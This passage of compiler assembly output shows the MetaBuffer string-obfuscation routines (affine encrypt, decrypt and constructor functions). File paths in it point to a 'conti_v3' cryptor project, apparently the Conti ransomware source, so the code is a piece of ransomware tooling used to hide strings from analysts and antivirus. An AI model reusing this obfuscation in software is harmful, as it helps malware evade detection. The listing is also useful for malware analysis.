  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001d9	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  001dd	88 85 c0 00 00
	00		 mov	 BYTE PTR tv168[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  001e3	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001ea	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  001f1	5f		 pop	 rdi
  001f2	5d		 pop	 rbp
  001f3	c3		 ret	 0
??0?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 4d	 sub	 eax, 77			; 0000004dH
  0002d	6b c0 0f	 imul	 eax, eax, 15
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 11	 imul	 eax, eax, 17
  0002d	83 c0 4d	 add	 eax, 77			; 0000004dH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0a	 cmp	 QWORD PTR i$1[rbp], 10
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv168 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001d9	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  001dd	88 85 c0 00 00
	00		 mov	 BYTE PTR tv168[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  001e3	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001ea	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  001f1	5f		 pop	 rdi
  001f2	5d		 pop	 rbp
  001f3	c3		 ret	 0
??0?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<113,110,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

